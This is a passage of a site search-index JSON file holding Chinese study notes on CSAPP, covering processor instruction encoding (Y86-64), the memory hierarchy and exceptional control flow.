NX\uff0c\u5219\u53ef\u5199\u4e0e\u53ef\u6267\u884c\u4e0d\u53ef\u517c\u5f97\uff0c\u7531\u6b64\u8d77\u5230\u4fdd\u62a4\u4f5c\u7528\uff01</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_14","title":"\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784","text":"<p>\u6839\u636e\u4e0a\u4e00\u7ae0\u300a\u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a\u300b\uff0c\u6211\u4eec\u77e5\u9053\u5904\u7406\u5668\u5fc5\u987b\u6267\u884c\u4e00\u7cfb\u5217\u6307\u4ee4\uff0c\u6bcf\u6761\u6307\u4ee4\u6267\u884c\u67d0\u4e2a\u7b80\u5355\u64cd\u4f5c\uff0c\u4f8b\u5982\u4e24\u4e2a\u6570\u76f8\u52a0\uff08\u6307\u4ee4 addq\uff09\u3002</p> <p>\u6240\u8c13 \u6307\u4ee4\u662f\u88ab\u7f16\u7801\u4e3a\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u5b57\u8282\u5e8f\u5217\u7ec4\u6210\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u4f8b\u5982\uff1a</p> <pre><code>0x488b542408 \u2192 move 0x8(%rsp), %rdx\n</code></pre> <p>\u4e8c\u8fdb\u5236\u5e8f\u5217 <code>0x488b542408</code> \u901a\u8fc7\u53cd\u6c47\u7f16\u5373\u53ef\u83b7\u5f97\u5176\u5bf9\u5e94\u7684\u6307\u4ee4 <code>move 0x8(%rsp), %rdx</code></p> <p>\u4e00\u4e2a\u5904\u7406\u5668\u652f\u6301\u7684\u6307\u4ee4\u548c\u6307\u4ee4\u7684\u5b57\u8282\u7ea7\u7f16\u7801\u79f0\u4e3a\u5b83\u7684 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784(ISA)\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5bb6\u65cf\uff08\u4f8b\u5982 Intel IA32\u3001x86-64\u3001AMD\uff09\u90fd\u6709\u4e0d\u540c\u7684 ISA\uff0c\u8fd9\u610f\u5473 \u7740\u4e00\u4e2a\u7a0b\u5e8f\u7f16\u8bd1\u6210\u53ef\u4ee5\u5728\u67d0\u4e00\u79cd\u673a\u5668\u4e0a\u8fd0\u884c\uff0c\u5c31\u4e0d\u80fd\u5728\u53e6\u4e00\u79cd\u673a\u5668\u4e0a\u8fd0\u884c\u3002</p> <p>\u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u786c\u4ef6\u7cfb\u7edf\u5982\u4f55\u6267\u884c ISA \u6307\u4ee4\uff0c\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\u662f\uff1a\u73b0\u4ee3\u5904\u7406\u5668\u5b9e\u9645\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ef\u80fd\u8ddf ISA \u9690\u542b\u7684\u8ba1\u7b97\u6a21\u578b\u5927\u76f8\u5f84\u5ead\u3002</p> <p>ISA \u6a21\u578b\u770b\u4e0a\u53bb\u5e94\u8be5\u662f \u987a\u5e8f\u6307\u4ee4\u6267\u884c\uff0c\u5373\u5148\u53d6\u51fa\u4e00\u6761\u6307\u4ee4\uff0c\u7b49\u5f85\u5b83\u6267\u884c\u5b8c\u6bd5\uff0c\u518d\u6267\u884c\u4e0b\u4e00\u6761\u3002</p> <p>\u7136\u800c\uff0c\u4e0e\u540c\u4e00\u65f6\u523b\u53ea\u6267\u884c\u4e00\u6761\u6307\u4ee4\u76f8\u6bd4\uff0c\u901a\u8fc7\u540c\u65f6\u5904\u7406\u591a\u6761\u6307\u4ee4\u7684\u4e0d\u540c\u90e8\u5206\uff0c\u5904\u7406\u5668\u53ef\u4ee5\u83b7\u5f97\u66f4\u9ad8\u7684\u6027\u80fd\u3002\u4e3a\u4e86\u4fdd\u8bc1\u5904\u7406\u5668\u80fd\u5f97\u5230\u540c\u987a\u5e8f\u6267\u884c\u76f8\u540c\u7684\u7ed3\u679c\uff0c\u9700\u8981\u4e00\u79cd\u7279\u6b8a\u7684\u673a\u5236\u6765\u5b9e\u73b0\u3002</p> <p>RISC \u548c CISC \u6307\u4ee4\u96c6\uff1a</p> <ul> <li>CISC\uff1a\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a\uff0c\u4f8b\u5982 x86-64</li> <li>RISC\uff1a\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a\uff0c\u4f8b\u5982 ARM</li> </ul> <p>\u5047\u8bbe\u5411\u8bbe\u8ba1\u4e00\u4e2a\u5904\u7406\u5668\uff0c\u4e3b\u8981\u5206\u4e3a\u5982\u4e0b\u6b65\u9aa4\uff1a</p> <ul> <li>\u6307\u4ee4\u53ca\u5176\u7f16\u7801</li> <li>\u5f02\u5e38\u5904\u7406</li> <li>\u7535\u8def\u3001\u786c\u4ef6\uff08todo\uff09\uff1a\u5927\u591a\u6570\u73b0\u4ee3\u7535\u8def\u8bbe\u8ba1\u90fd\u662f\u7528\u4fe1\u53f7\u7ebf\u4e0a\u7684\u9ad8\u7535\u538b\u548c\u4f4e\u7535\u538b\u6765\u8868\u793a\u4e0d\u540c\u7684\u4f4d\u503c\u3002</li> </ul> <p>\u2460 \u6307\u4ee4\u53ca\u7f16\u7801\uff1aY86-64</p> <p>\u5c06\u8bbe\u8ba1\u7684 ISA \u547d\u540d\u4e3a Y86-64\uff0c\u56e0\u4e3a\u53d7\u5230 x86 \u7684\u542f\u53d1\uff01</p> <p>\u5177\u4f53\u53ef\u67e5\u770b CSAPP P246\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1aret \u6307\u4ee4\u7684 16 \u8fdb\u5236\u4e3a 90\u3002</p> <p>\u8be5 ISA \u5171\u8bbe\u7f6e 15 \u4e2a\u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u6709\u4e00\u4e2a\u76f8\u5bf9\u5e94\u7684\u8303\u56f4\u5728 0 \u5230 0xE \u4e4b\u95f4\u7684 \u5bc4\u5b58\u5668\u6807\u8bc6\u7b26\uff08register ID\uff09\uff0c\u8be5\u5bc4\u5b58\u5668\u7f16\u53f7\u4e0e x86-64 \u4e2d\u7684\u76f8\u540c\u3002</p> <p>\u8fd9\u79cd\u5bc4\u5b58\u5668\u79f0\u4e3a\u7a0b\u5e8f\u5bc4\u5b58\u5668\uff0c\u5b58\u5728 CPU \u4e2d\u7684\u4e00\u4e2a\u5bc4\u5b58\u5668\u6587\u4ef6\uff0c\u8be5\u5bc4\u5b58\u5668\u6587\u4ef6\u5c31\u662f\u4e00\u4e2a\u4ee5\u5bc4\u5b58\u5668 ID \u4f5c\u4e3a\u5730\u5740\u7684\u968f\u673a\u8bbf\u95ee\u5b58\u50a8\u5668\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>rmmovq %rsp, 0x123456789abcd(%rdx)\n</code></pre> <ul> <li> <p>rmmovq \u7684\u5b57\u8282\u4e3a 40</p> </li> <li> <p>%rsp \u7684\u5730\u5740\u4e3a 4</p> </li> <li> <p>%rdx \u7684\u5730\u5740\u4e3a 2</p> </li> <li> <p>0x123456789abcd \u9996\u5148\u586b\u5145 0 \u4f7f\u5176\u53d8\u4e3a 8 \u5b57\u8282\uff1a 00 01 23 45 67 89 ab cd</p> </li> <li> <p>\u7531\u4e8e\u6240\u6709\u6574\u6570\u91c7\u7528\u5c0f\u7aef\u5e8f\u7f16\u7801\uff0c\u5f53\u6307\u4ee4\u6309\u7167\u53cd\u6c47\u7f16\u683c\u5f0f\u4e66\u5199\u65f6\uff0c\u5b57\u8282\u4f1a\u4ee5\u76f8\u53cd\u7684\u987a\u5e8f\u51fa\u73b0</p> </li> </ul> <p>\u56e0\u6b64\u5c06\u5b57\u8282\u8fd4\u5e8f\uff0c\u5f97\u5230 cd ab 89 67 45 23 01 11</p> <p>\u4e8e\u662f\u5f97\u5230\u6307\u4ee4\u7684\u6700\u7ec8\u7f16\u7801\uff1a</p> <pre><code>0x4042cdab896745230111\n</code></pre> <p>\u2461 \u5f02\u5e38\u5904\u7406</p> <p>\u53c2\u8003\u300a\u5f02\u5e38\u63a7\u5236\u6d41\uff1a\u4e2d\u65ad\u4e0e\u7cfb\u7edf\u8c03\u7528\u300b</p> <p>\u2462TODO</p> <p>\u968f\u540e\u4e66\u672c\u4ecb\u7ecd\u4e86\u987a\u5e8f\u548c\u6d41\u6c34\u7ebf\u4e24\u79cd\u5f62\u5f0f\u7684\u5b9e\u73b0\uff0c\u6b64\u5904\u4ecb\u7ecd\u4e00\u4e0b\u6307\u4ee4\u6267\u884c\u7684\u987a\u5e8f\uff1a</p> <ul> <li> <p>\u53d6\u503c\uff1aPC \u8bb0\u5f55\u4e86\u4e0b\u4e00\u4e2a\u5f85\u6267\u884c\u6307\u4ee4\u7684\u5730\u5740\uff0c\u57fa\u4e8e\u8be5\u5730\u5740\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u6307\u4ee4\u5b57\u8282</p> </li> <li> <p>\u8bd1\u7801\uff1a\u6309\u7167\u9884\u5b9a\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u5bf9\u53d6\u56de\u7684\u6307\u4ee4\u8fdb\u884c\u62c6\u5206\u548c\u89e3\u91ca\uff0c\u8bc6\u522b\u533a\u5206\u51fa\u4e0d\u540c\u7684\u6307\u4ee4\u7c7b\u522b\u4ee5\u53ca\u5404\u79cd\u83b7\u53d6\u64cd\u4f5c\u6570\u7684\u65b9\u6cd5\u3002   \u8be5\u9636\u6bb5\u8fd8\u8d1f\u8d23\u4ece\u5bc4\u5b58\u5668\u4e2d\u8bfb\u51fa\u503c\u3002</p> </li> <li> <p>\u6267\u884c\uff1a\u5b8c\u6210\u6307\u4ee4\u6240\u89c4\u5b9a\u7684\u5404\u79cd\u64cd\u4f5c\uff0c\u5177\u4f53\u5b9e\u73b0\u6307\u4ee4\u7684\u529f\u80fd\u3002\u4e3a\u6b64\uff0cCPU \u7684\u4e0d\u540c\u90e8\u5206\u88ab\u8fde\u63a5\u8d77\u6765\uff0c\u4ee5\u6267\u884c\u6240\u9700\u7684\u64cd\u4f5c\u3002</p> </li> </ul> <p>\u4f8b\u5982\uff0c\u5982\u679c\u8981\u6c42\u5b8c\u6210\u4e00\u4e2a\u52a0\u6cd5\u8fd0\u7b97\uff0c\u7b97\u672f\u903b\u8f91\u5355\u5143 ALU \u5c06\u88ab\u8fde\u63a5\u5230\u4e00\u7ec4\u8f93\u5165\u548c\u4e00\u7ec4\u8f93\u51fa\uff0c\u8f93\u5165\u7aef\u63d0\u4f9b\u9700\u8981\u76f8\u52a0\u7684\u6570\u503c\uff0c\u8f93\u51fa\u7aef\u5c06\u542b\u6709\u6700\u540e\u7684\u8fd0\u7b97\u7ed3\u679c\u3002</p> <ul> <li> <p>\u8bbf\u5b58\uff1a\u5c06\u6570\u636e\u5199\u5165\u5185\u5b58\uff0c\u6216\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u6570\u636e</p> </li> <li> <p>\u5199\u56de\uff1a\u901a\u5e38\u662f\u5c06\u6570\u636e\u5199\u5165\u5bc4\u5b58\u5668\u4e2d</p> </li> <li> <p>\u66f4\u65b0 PC\uff1a\u5c06 PC \u8bbe\u7f6e\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</p> </li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_15","title":"\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784","text":"<p>\u5728\u4e0a\u6587\u7684\u7814\u7a76\u4e2d\uff0c\u6211\u4eec\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u7b80\u5355\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6a21\u578b\uff1aCPU \u6267\u884c\u6307\u4ee4\uff0c\u800c\u5b58\u50a8\u5668\u7cfb\u7edf\u4e3a CPU \u5b58\u653e\u6307\u4ee4\u548c\u6570\u636e\uff0c\u5c06\u5176\u8ba4\u4e3a\u662f\u4e00\u4e2a\u7ebf\u6027\u7684\u5b57\u8282\u6570\u7ec4\uff0c\u800c CPU \u80fd\u591f\u5728\u4e00\u4e2a\u5e38\u6570\u65f6\u95f4\u5185\u8bbf\u95ee\u6bcf\u4e2a\u5b58\u50a8\u5668\u4f4d\u7f6e\u3002</p> <p>\u4f46\u5b9e\u9645\u4e0a\uff0c\u73b0\u4ee3\u5b58\u50a8\u5668\u7cfb\u7edf\u662f\u4e00\u4e2a\u5177\u6709\u4e0d\u540c\u5bb9\u91cf\u3001\u6210\u672c\u548c\u8bbf\u95ee\u65f6\u95f4\u7684\u5b58\u50a8\u8bbe\u5907\u7684\u5c42\u6b21\u7ed3\u6784\uff1a</p> <ul> <li>CPU \u5bc4\u5b58\u5668</li> <li>\u9ad8\u901f\u7f13\u5b58\u5b58\u50a8\u5668\uff1a\u9760\u8fd1 CPU\u3001\u5bb9\u91cf\u5c0f\u4e14\u5feb\u901f\u3002\u7f13\u5b58\u5b58\u50a8\u5728\u76f8\u5bf9\u6162\u901f\u7684\u4e3b\u5b58\u50a8\u5668\u4e2d\u6570\u636e\u548c\u6307\u4ee4\u7684\u4e00\u90e8\u5206\u3002</li> <li>\u4e3b\u5b58\u50a8\u5668\uff08\u4e3b\u5b58\uff09\uff1a\u7f13\u5b58\u5b58\u50a8\u5728\u5bb9\u91cf\u5927\u4e14\u6162\u901f\u7684\u78c1\u76d8\u4e0a\u7684\u6570\u636e</li> <li>\u78c1\u76d8\uff1a\u6301\u4e45\u5b58\u50a8\uff0c\u4e0a\u8ff0\u51e0\u79cd\u65ad\u7535\u540e\u6570\u636e\u6d88\u5931\u3002</li> </ul> <p>\u5c42\u6b21\u673a\u6784\u4e4b\u6240\u4ee5\u53ef\u884c\uff0c\u662f\u56e0\u4e3a\u5c40\u90e8\u6027\u539f\u7406\uff0c\u901a\u5e38\u4f1a\u9891\u7e41\u7684\u8bbf\u95ee\u5c40\u90e8\u6570\u636e\u3002</p> <p>\u51e0\u4e2a\u540d\u8bcd\uff1a</p> <ul> <li>\u9759\u6001 RAM\uff08SRAM\uff09\uff1a\u5feb\u3001\u8d35\u3001\u4e0d\u53ef\u6301\u4e45\u5b58\u50a8</li> <li>\u52a8\u6001 RAM\uff08DRAM\uff09\uff1a\u6ca1 SRAM \u5feb\uff0c\u4f46\u76f8\u5bf9\u4fbf\u5b9c\uff0c\u4e0d\u53ef\u6301\u4e45\u5b58\u50a8</li> <li>\u53ef\u64e6\u5199\u53ef\u7f16\u7a0b ROM\uff08EPROM\uff09\uff0c\u53ef\u6301\u4e45\u5b58\u50a8</li> <li>\u95ea\u5b58\u662f\u4e00\u79cd\u975e\u6613\u5931\u6027\u5b58\u50a8\u5668\uff0c\u57fa\u4e8e EEPROM\uff08\u7c7b\u4f3c EPROM\uff09\uff0c\u800c\u56fa\u6001\u786c\u76d8\uff08SSD\uff09\u6b63\u662f\u65b0\u578b\u7684\u57fa\u4e8e\u95ea\u5b58\u7684\u78c1\u76d8\u9a71\u52a8\u5668</li> <li>\u78c1\u76d8\uff1a\u53ef\u6301\u4e45\u5b58\u50a8\uff0c\u5f88\u6162\uff0c\u8be6\u89c1 CSAPP 407</li> </ul> <p>DRAM \u6709\u591a\u79cd\u6539\u826f\u589e\u5f3a\u7248\u672c\uff0c\u73b0\u4ee3\u7684 \u4e3b\u5b58 \u901a\u5e38\u5c31\u662f\u4f7f\u7528 DRAM\uff0c\u90a3\u5982\u4f55\u8bbf\u95ee\u4e3b\u5b58\u5462\uff1f</p> <p>\u6570\u636e\u6d41\u901a\u8fc7\u6210\u4e3a \u603b\u7ebf\uff08bus\uff09 \u7684\u5171\u4eab\u7535\u5b50\u7535\u8def\u5728\u5904\u7406\u5668\u548c DRAM \u4e3b\u5b58\u4e4b\u95f4\u6765\u6765\u56de\u56de\uff0c\u8be6\u7ec6\u8bfb\u53d6\u53c2\u89c1 CSAPP 406</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_16","title":"\u5f02\u5e38\u63a7\u5236\u6d41","text":"<p>\u7ed3\u5408\u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a\u548c\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u4e24\u7ae0\u53ef\u77e5\uff0c\u5bc4\u5b58\u5668 PC \u4e2d\u5b58\u653e\u4e86\u5f85\u6267\u884c\u6307\u4ee4 \\(I_k\\) \u7684\u5730\u5740\uff0cCPU \u4f1a\u6839\u636e PC \u4e2d\u7684\u5730\u5740\u4ece\u5185\u5b58\u4e2d\u83b7\u53d6\u6307\u4ee4\u3002</p> <p>\u901a\u5e38\u6765\u8bf4\uff0c\u4ece\u6307\u4ee4 \\(I_k\\) \u5230 \\(I_{k+1}\\) \u7684\u8f6c\u53d8\u662f\u5e73\u6ed1\u7684\uff0c\u4e5f\u5c31\u662f\\(I_k\\) \u548c \\(I_{k+1}\\)\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u662f\u76f8\u90bb\u7684\u3002</p> <p>\u4f46\u5076\u5c14\u4e5f\u4f1a\u53d1\u751f \u63a7\u5236\u6d41\u7a81\u53d8\uff0c\u4f8b\u5982\u8df3\u8f6c\u3001\u8c03\u7528\u548c\u8fd4\u56de\u8fd9\u6837\u4e00\u4e9b\u7a0b\u5e8f\u6307\u4ee4\uff0c\u8fd9\u5757\u5185\u5bb9\u5728\u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a\u4e2d\u8fdb\u884c\u4e86\u4ecb\u7ecd\u3002\u4f8b\u5982\u5f53\u53d1\u751f\u51fd\u6570\u8c03\u7528\u65f6\uff0ccall \u6307\u4ee4\u4f1a\u4fee\u6539 PC \u81f3\u76ee\u6807\u4f4d\u7f6e\uff0c\u5e76\u5c06\u8fd4\u56de\u5730\u503c\u538b\u5165\u6808\u4e2d\uff0c\u88ab\u8c03\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u6700\u540e\u4e00\u53e5 ret \u6307\u4ee4\u4f1a\u5c06\u8fd4\u56de\u5730\u5740\u4ece\u6808\u4e2d\u5f39\u51fa\u3002\u4e00\u822c\u8fd4\u56de\u5730\u5740\u5c31\u662f call \u6307\u4ee4\u7684\u4e0b\u4e00\u53e5\u6307\u4ee4\u6240\u5728\u7684\u5730\u5740\u3002\u6b64\u5916\uff0c\u8fd8\u6709 jmp \u7b49\u8df3\u8f6c\u6307\u4ee4\u4e5f\u4f1a\u4ea7\u751f\u4f4d\u7f6e\u7a81\u53d8\u3002</p> <p>\u4e0a\u8ff0\u673a\u5236\u4f7f\u5f97\u7a0b\u5e8f\u80fd\u591f\u5bf9\u7a0b\u5e8f\u53d8\u91cf\u8868\u793a\u7684\u5185\u90e8\u7a0b\u5e8f\u72b6\u6001\u4e2d\u7684\u53d8\u5316\u505a\u51fa\u53cd\u5e94</p> <p>\u4f46\u662f\uff0c\u7cfb\u7edf\u4e5f\u5fc5\u987b\u80fd\u591f\u5bf9\u7cfb\u7edf\u72b6\u6001\u7684\u53d8\u5316\u505a\u51fa\u53cd\u5e94\uff0c\u8fd9\u4e9b\u7cfb\u7edf\u72b6\u6001\u4e0d\u662f\u88ab\u5185\u90e8\u7a0b\u5e8f\u53d8\u91cf\u6355\u83b7\u7684\uff0c\u4e5f\u4e0d\u4e00\u5b9a\u8981\u548c\u7a0b\u5e8f\u7684\u6267\u884c\u76f8\u5173\u3002\u4f8b\u5982\uff1a</p> <ul> <li>\u4e00\u4e2a\u786c\u4ef6\u5b9a\u65f6\u5668\u5b9a\u671f\u4ea7\u751f\u4fe1\u53f7\uff0c\u8fd9\u4e2a\u65f6\u95f4\u5fc5\u987b\u5f97\u5230\u5904\u7406\u3002</li> <li>\u5305\u5230\u8fbe\u7f51\u7edc\u9002\u914d\u5668\u540e\uff0c\u5fc5\u987b\u5b58\u653e\u5728\u5185\u5b58\u4e2d\u3002</li> <li>\u7a0b\u5e8f\u5411\u78c1\u76d8\u8bf7\u6c42\u6570\u636e\uff0c\u7136\u540e\u4f11\u7720\uff0c\u76f4\u5230\u88ab\u901a\u77e5\u8bf4\u6570\u636e\u5df2\u5c31\u7eea\u3002</li> <li>\u5f53\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u65f6\uff0c\u521b\u5efa\u5b83\u7684\u7236\u8fdb\u7a0b\u5fc5\u987b\u5f97\u5230\u901a\u77e5\u3002</li> </ul> <p>\u73b0\u4ee3\u7cfb\u7edf\u901a\u8fc7\u4f7f\u63a7\u5236\u6d41\u53d1\u751f\u7a81\u53d8\u6765\u5bf9\u8fd9\u4e9b\u60c5\u51b5\u505a\u51fa\u53cd\u5e94\uff0c\u6211\u4eec\u5c06\u6b64\u7c7b\u7a81\u53d8\u79f0\u4e3a \u5f02\u5e38\u63a7\u5236\u6d41\u3002</p> <p>\u5f02\u5e38\u63a7\u5236\u6d41\u53d1\u751f\u5728\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u5404\u4e2a\u5c42\u6b21\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u5728\u786c\u4ef6\u5c42\uff1a\u786c\u4ef6\u68c0\u6d4b\u5230\u7684\u4e8b\u4ef6\u4f1a\u89e6\u53d1\u63a7\u5236\u7a81\u7136\u8f6c\u79fb\u5230\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f</li> <li>\u5728\u64cd\u4f5c\u7cfb\u7edf\u5c42\uff1a\u5185\u6838\u901a\u8fc7\u4e0a\u4e0b\u6587\u5207\u6362\u5c06\u63a7\u5236\u4ece\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b</li> <li>\u5728\u5e94\u7528\u5c42\uff1a\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u53d1\u9001\u4fe1\u53f7\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u800c\u63a5\u53d7\u8005\u4f1a\u5c06\u63a7\u5236\u7a81\u7136\u8f6c\u79fb\u5230\u5b83\u7684\u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u3002</li> </ul> <p>\u603b\u7684\u6765\u8bf4\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u56de\u907f\u901a\u5e38\u7684\u6808\u89c4\u5219\uff0c\u5e76\u6267\u884c\u5230\u5176\u4ed6\u51fd\u6570\u4e2d\u4efb\u610f\u4f4d\u7f6e\u7684\u975e\u672c\u5730\u8df3\u8f6c\u6765\u5bf9\u9519\u8bef\u505a\u51fa\u53cd\u5e94\u3002</p> <p>\u672c\u7ae0\u5c06\u6839\u636e\u5f02\u5e38\u53d1\u751f\u7684\u4e09\u4e2a\u5c42\u6b21\u4ecb\u7ecd\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_17","title":"\u786c\u4ef6\u5c42\uff1a\u5f02\u5e38","text":"<p>\u5f02\u5e38\uff08exception\uff09\u662f\u5f02\u5e38\u63a7\u5236\u6d41\u7684\u4e00\u79cd\u5f62\u5f0f\uff0c\u5b83\u7684\u4e00\u90e8\u5206\u7531\u786c\u4ef6\u5b9e\u73b0\uff0c\u4e00\u90e8\u5206\u7531\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5f02\u5e38\u5c31\u662f\u63a7\u5236\u6d41\u4e2d\u7684\u7a81\u53d8\uff0c\u7528\u6765 \u54cd\u5e94\u5904\u7406\u5668\u72b6\u6001\u4e2d\u7684\u67d0\u4e9b\u53d8\u5316\u3002</p> <p></p> <p>\u5728\u56fe\u4e2d\uff0c\u5f53\u5904\u7406\u5668\u72b6\u6001\u4e2d\u53d1\u751f\u4e00\u4e2a\u91cd\u8981\u7684\u53d8\u5316\u65f6\uff0c\u5904\u7406\u5668\u6b63\u5728\u6267\u884c\u67d0\u4e2a\u5f53\u524d\u6307\u4ee4 \\(I_{curr}\\)\u3002\u5728\u5904\u7406\u5668\u4e2d\uff0c\u72b6\u6001\u88ab\u7f16\u7801\u4e3a\u4e0d\u540c\u7684\u4f4d\u548c\u4fe1\u53f7\u3002\u72b6\u6001\u53d8\u5316\u79f0\u4e3a \u4e8b\u4ef6\uff08event\uff09:</p> <ul> <li>\u4e8b\u4ef6\u53ef\u80fd\u548c\u5f53\u524d\u6307\u4ee4\u7684\u6267\u884c\u76f4\u63a5\u76f8\u5173\u3002\u6bd4\u5982\uff0c\u53d1\u751f\u865a\u62df\u5185\u5b58\u7f3a\u9875\u3001\u7b97\u672f\u6ea2\u51fa\uff0c\u6216\u8005\u4e00\u6761\u6307\u4ee4\u8bd5\u56fe\u9664\u4ee5\u96f6\u3002</li> <li>\u4e8b\u4ef6\u4e5f\u53ef\u80fd\u548c\u5f53\u524d\u6307\u4ee4\u7684\u6267\u884c\u6ca1\u6709\u5173\u7cfb\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u7cfb\u7edf\u5b9a\u65f6\u5668\u4ea7\u751f\u4fe1\u53f7\u6216\u8005\u4e00\u4e2a I/O \u8bf7\u6c42\u5b8c\u6210\u3002</li> </ul> <p>\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u5f53\u5904\u7406\u5668\u68c0\u6d4b\u5230\u6709\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5b83\u5c31\u4f1a\u901a\u8fc7\u4e00\u5f20\u53eb\u505a \u5f02\u5e38\u8868\uff08exception table\uff09\u7684\u8df3\u8f6c\u8868\uff0c\u8fdb\u884c\u4e00\u4e2a\u95f4\u63a5\u8fc7\u7a0b\u8c03\u7528\uff08\u5f02\u5e38\uff09\uff0c\u5230\u4e00\u4e2a\u4e13\u95e8\u8bbe\u8ba1\u7528\u6765\u5904\u7406\u8fd9\u7c7b\u4e8b\u4ef6\u7684\u64cd\u4f5c\u7cfb\u7edf\u5b50\u7a0b\u5e8f\uff0c\u79f0\u4e3a \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08exception handler\uff09.</p> <p>\u5f53\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5b8c\u6210\u5904\u7406\u540e\uff0c\u6839\u636e\u5f15\u8d77\u5f02\u5e38\u7684\u4e8b\u4ef6\u7684\u7c7b\u578b\uff0c\u4f1a\u53d1\u751f\u4ee5\u4e0b 3 \u79cd\u60c5\u51b5\u4e2d\u7684\u4e00\u79cd\uff1a</p> <ol> <li>\u5904\u7406\u7a0b\u5e8f\u5c06\u63a7\u5236\u8fd4\u56de\u7ed9\u5f53\u524d\u6307\u4ee4 \\(I_{curr}\\) \uff0c\u5373\u5f53\u4e8b\u4ef6\u53d1\u751f\u65f6\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002</li> <li>\u5904\u7406\u7a0b\u5e8f\u5c06\u63a7\u5236\u8fd4\u56de\u7ed9 \\(I_{next}\\) \uff0c\u5982\u679c\u6ca1\u6709\u53d1\u751f\u5f02\u5e38\u5c06\u4f1a\u6267\u884c\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u3002</li> <li>\u5904\u7406\u7a0b\u5e8f\u7ec8\u6b62\u88ab\u4e2d\u65ad\u7684\u7a0b\u5e8f\u3002</li> </ol> <p>\u524d\u6587\u63d0\u5230\u5f02\u5e38\u7531\u8f6f\u4ef6\u548c\u786c\u4ef6\u5171\u540c\u5b9e\u73b0\uff0c\u6b64\u5904\u8be6\u7ec6\u4ecb\u7ecd\u4e8c\u8005\u7684\u5206\u5de5\u3002</p> <p>\u7cfb\u7edf\u4e2d\u53ef\u80fd\u7684\u6bcf\u79cd\u7c7b\u578b\u7684\u5f02\u5e38\u90fd\u5206\u914d\u4e86\u4e00\u4e2a\u552f\u4e00\u7684\u975e\u8d1f\u6574\u6570\u7684 \u5f02\u5e38\u53f7\uff08exception number\uff09:</p> <ul> <li>\u4e00\u4e9b\u53f7\u7801\u662f\u7531\u5904\u7406\u5668\u7684\u8bbe\u8ba1\u8005\u5206\u914d\uff1a\u4f8b\u5982\u5305\u62ec\u88ab\u96f6\u9664\u3001\u7f3a\u9875\u3001\u5185\u5b58\u8bbf\u95ee\u8fdd\u4f8b\u3001\u65ad\u70b9\u4ee5\u53ca\u7b97\u672f\u8fd0\u7b97\u6ea2\u51fa\u3002</li> 